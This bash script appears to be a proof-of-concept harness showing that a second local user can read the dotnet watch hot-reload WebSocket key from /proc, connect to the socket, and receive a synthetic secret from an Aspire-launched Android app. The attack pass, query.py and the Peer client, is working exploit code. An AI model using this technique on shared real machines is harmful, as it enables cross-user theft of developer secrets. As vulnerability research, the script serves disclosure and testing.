#!/usr/bin/env bash
set -euo pipefail
umask 022

root="$(mktemp -d /tmp/f042-maui-aspire.XXXXXX)"
host="$root/Host"
mobile="$root/Mobile"
peer="$root/Peer"
mkdir -p "$host" "$mobile" "$peer"
chmod 755 "$peer"
echo "F042_SDK=$(dotnet --version)"
echo "F042_PROC_MOUNT=$(findmnt -no OPTIONS /proc)"
echo "F042_OWNER_UID=$(id -u)"
echo "F042_OWNER_DIR_MODE=$(stat -c %a "$root")"

dotnet new android -n F042Mobile -o "$mobile" --no-restore
sed -i '/<PropertyGroup>/a\    <ApplicationId>com.example.f042mobile</ApplicationId>' "$mobile/F042Mobile.csproj"
cat > "$host/Host.csproj" <<EOF
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net11.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <IsAspireHost>true</IsAspireHost>
  </PropertyGroup>
  <ItemGroup>
    <PackageReference Include="Aspire.Hosting.AppHost" Version="13.6.5" />
    <PackageReference Include="Aspire.Hosting.Maui" Version="13.6.5-preview.1.26559.7" />
    <ProjectReference Include="$mobile/F042Mobile.csproj" ReferenceOutputAssembly="false" />
  </ItemGroup>
</Project>
EOF
cat > "$host/Program.cs" <<'EOF'
using Aspire.Hosting;
using Aspire.Hosting.ApplicationModel;
using System.Security.Cryptography;

var secret = Convert.ToHexString(RandomNumberGenerator.GetBytes(24));
var expectedHash = Convert.ToHexString(SHA256.HashData(System.Text.Encoding.UTF8.GetBytes(secret))).ToLowerInvariant();
File.WriteAllText(Environment.GetEnvironmentVariable("F042_EXPECTED_HASH_FILE")!, expectedHash);
File.WriteAllLines(Environment.GetEnvironmentVariable("F042_HOST_CREDENTIAL_FILE")!, new[]
{
    Environment.GetEnvironmentVariable("DEBUG_SESSION_PORT") ?? "",
    Environment.GetEnvironmentVariable("DEBUG_SESSION_TOKEN") ?? "",
    Environment.GetEnvironmentVariable("DEBUG_SESSION_SERVER_CERTIFICATE") ?? ""
});
Console.WriteLine("F042_HOST_READY HASH=" + expectedHash);
var builder = DistributedApplication.CreateBuilder(args);
var maui = builder.AddMauiProject("f042mobile", Environment.GetEnvironmentVariable("F042_MOBILE_PROJECT")!);
var android = maui.AddAndroidEmulator().WithEnvironment("F042_SYNTH_SECRET", secret);
// The documented dashboard Start action removes this explicit-start condition.
// Do it here so an unattended owned runner can exercise the same resource launch.
foreach (var annotation in android.Resource.Annotations.OfType<ExplicitStartupAnnotation>().ToArray())
    android.Resource.Annotations.Remove(annotation);
builder.Build().Run();
EOF
cat > "$peer/Peer.csproj" <<'EOF'
<Project Sdk="Microsoft.NET.Sdk">
  <PropertyGroup>
    <OutputType>Exe</OutputType><TargetFramework>net11.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings><Nullable>enable</Nullable>
  </PropertyGroup>
</Project>
EOF
cat > "$peer/Program.cs" <<'EOF'
using System.Net;
using System.Net.WebSockets;
using System.Security.Cryptography;
using System.Text;

var (endpoint, key, mode) = (args[0], args[1], args[2]);
using var socket = new ClientWebSocket();
socket.Options.SetRequestHeader("Origin", mode == "bad-origin" ? "wss://wrong.example" : "wss://localhost");
if (mode == "valid")
{
    using var rsa = RSA.Create();
    rsa.ImportSubjectPublicKeyInfo(Convert.FromBase64String(key), out _);
    var encrypted = rsa.Encrypt(RandomNumberGenerator.GetBytes(32), RSAEncryptionPadding.OaepSHA256);
    socket.Options.AddSubProtocol(WebUtility.UrlEncode(Convert.ToBase64String(encrypted)));
}
else socket.Options.AddSubProtocol("f042-invalid");
using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(12));
try
{
    await socket.ConnectAsync(new Uri(endpoint), cts.Token);
    Console.WriteLine("F042_" + mode + "=ACCEPTED");
    if (mode != "valid") return;
    await socket.SendAsync(new byte[]{ 1, 1, 0, 0, 0, 0, 1, (byte)'x' }, WebSocketMessageType.Binary, true, cts.Token);
    var incoming = new byte[8192];
    var result = await socket.ReceiveAsync(incoming, cts.Token);
    Console.WriteLine("F042_FRAME_TYPE=" + (result.Count > 0 ? incoming[0] : -1));
    if (result.Count == 0 || incoming[0] != 1) return;
    using var stream = new MemoryStream(incoming, 0, result.Count);
    using var reader = new BinaryReader(stream);
    reader.ReadByte();
    var count = reader.ReadInt32();
    Console.WriteLine("F042_RPC_COUNT=" + count);
    for (int i=0; i<count; i++)
    {
        var name = reader.ReadString();
        var value = reader.ReadString();
        if (name == "F042_SYNTH_SECRET")
            Console.WriteLine("F042_RECEIVED_HASH=" + Convert.ToHexString(SHA256.HashData(Encoding.UTF8.GetBytes(value))).ToLowerInvariant());
    }
}
catch (Exception e)
{
    Console.WriteLine("F042_" + mode + "=DENIED:" + e.GetType().Name + ":" + e.Message.Replace(Environment.NewLine, " "));
}
EOF
dotnet restore "$host/Host.csproj" --nologo
dotnet build "$host/Host.csproj" --no-restore --nologo
dotnet build "$peer/Peer.csproj" --nologo
chmod -R a+rX "$peer"
sudo useradd -m -s /bin/bash f042_peer

export F042_MOBILE_PROJECT="$mobile/F042Mobile.csproj"
export F042_EXPECTED_HASH_FILE="$root/expected-hash"
export F042_HOST_CREDENTIAL_FILE="$root/host-credentials"
touch "$F042_EXPECTED_HASH_FILE" "$F042_HOST_CREDENTIAL_FILE"
chmod 600 "$F042_EXPECTED_HASH_FILE" "$F042_HOST_CREDENTIAL_FILE"
watch_log="$root/watch.log"

cleanup_watch() {
    if [[ -n "${watchpid:-}" ]]; then
        kill "$watchpid" 2>/dev/null || true
        wait "$watchpid" 2>/dev/null || true
        watchpid=""
    fi
}
trap cleanup_watch EXIT

echo F042_BASELINE_START
dotnet watch --project "$host/Host.csproj" run --no-restore > "$watch_log" 2>&1 &
watchpid=$!
for i in $(seq 1 240); do
    if adb shell pidof com.example.f042mobile >/dev/null 2>&1; then
        echo F042_BASELINE_MOBILE_PROCESS=RUNNING
        break
    fi
    sleep 0.5
done
if ! adb shell pidof com.example.f042mobile >/dev/null 2>&1; then
    echo F042_BASELINE_MOBILE_PROCESS=MISSING
fi
echo "F042_BASELINE_KEY_PROCESS_COUNT=$(python3 - <<'PY'
import glob
n=0
for p in glob.glob('/proc/[0-9]*/cmdline'):
    try: n += b'DOTNET_WATCH_HOTRELOAD_WEBSOCKET_KEY=' in open(p,'rb').read()
    except OSError: pass
print(n)
PY
)"
grep -E 'F042_|WebSocket|Aspire|error|Error|failed|Failed' "$watch_log" | tail -60 || true
cleanup_watch
sleep 3

echo F042_ATTACK_START
: > "$F042_EXPECTED_HASH_FILE"
: > "$F042_HOST_CREDENTIAL_FILE"
cat > "$peer/query.py" <<'EOF'
import glob, os, subprocess, sys, time
dotnet, dll, protected_file = sys.argv[1:4]
print('F042_ATTACK_UID=' + str(os.getuid()), flush=True)
try:
    open(protected_file).read()
    print('F042_DIRECT_OWNER_FILE=READABLE', flush=True)
except OSError as e:
    print('F042_DIRECT_OWNER_FILE=' + e.__class__.__name__, flush=True)
for _ in range(2400):
    for path in glob.glob('/proc/[0-9]*/cmdline'):
        try: raw=open(path,'rb').read()
        except OSError: continue
        args=raw.split(b'\0')
        key=next((x.split(b'=',1)[1] for x in args if x.startswith(b'DOTNET_WATCH_HOTRELOAD_WEBSOCKET_KEY=')),b'')
        endpoint=next((x.split(b'=',1)[1] for x in args if x.startswith(b'DOTNET_WATCH_HOTRELOAD_WEBSOCKET_ENDPOINT=')),b'')
        if not(key and endpoint): continue
        pid=path.split('/')[2]
        print('F042_ARGV_VISIBLE=True PID=' + pid + ' ENDPOINT=' + endpoint.decode() + ' KEY_LENGTH=' + str(len(key)),flush=True)
        print('F042_SECRET_NAME_IN_ARGV=' + str(b'F042_SYNTH_SECRET=' in raw), flush=True)
        try:
            open('/proc/'+pid+'/environ','rb').read()
            print('F042_CROSS_UID_ENVIRON=READABLE',flush=True)
        except OSError as e:
            print('F042_CROSS_UID_ENVIRON=' + e.__class__.__name__,flush=True)
        for mode in ('bad-origin','bad-key','valid'):
            r=subprocess.run([dotnet,dll,endpoint.decode(),key.decode(),mode],capture_output=True,text=True,timeout=18)
            print(r.stdout.strip(),flush=True)
            if r.stderr.strip(): print('F042_PEER_STDERR='+r.stderr.strip()[:200],flush=True)
        sys.exit(0)
    time.sleep(0.1)
print('F042_ARGV_VISIBLE=False',flush=True)
sys.exit(2)
EOF
chmod a+r "$peer/query.py"
sudo -u f042_peer python3 "$peer/query.py" "$(command -v dotnet)" "$peer/bin/Debug/net11.0/Peer.dll" "$F042_EXPECTED_HASH_FILE" > "$root/peer.log" 2>&1 &
peerpid=$!
dotnet watch --project "$host/Host.csproj" run --no-restore > "$watch_log" 2>&1 &
watchpid=$!
wait "$peerpid" || true
echo "F042_EXPECTED_HASH=$(cat "$F042_EXPECTED_HASH_FILE")"
cat "$root/peer.log"
if [[ -s "$F042_EXPECTED_HASH_FILE" ]]; then
    expected="$(cat "$F042_EXPECTED_HASH_FILE")"
    received="$(sed -n 's/^F042_RECEIVED_HASH=//p' "$root/peer.log" | tail -1)"
    echo "F042_HASH_MATCH=$([[ "$expected" == "$received" ]] && echo True || echo False)"
fi
if grep -q 'Generated environment targets file for Android:' "$watch_log"; then
    path="$(sed -n 's/.*Generated environment targets file for Android: //p' "$watch_log" | tail -1)"
    echo "F042_ANDROID_TARGETS_MODE=$(stat -c %a "$path")"
    echo "F042_ANDROID_TARGETS_PARENT_MODE=$(stat -c %a "$(dirname "$path")")"
    if sudo -u f042_peer test -r "$path"; then echo F042_DIRECT_TARGETS=READABLE; else echo F042_DIRECT_TARGETS=DENIED; fi
fi
grep -E 'F042_|WebSocket|Aspire|error|Error|failed|Failed' "$watch_log" | tail -100 || true
cleanup_watch
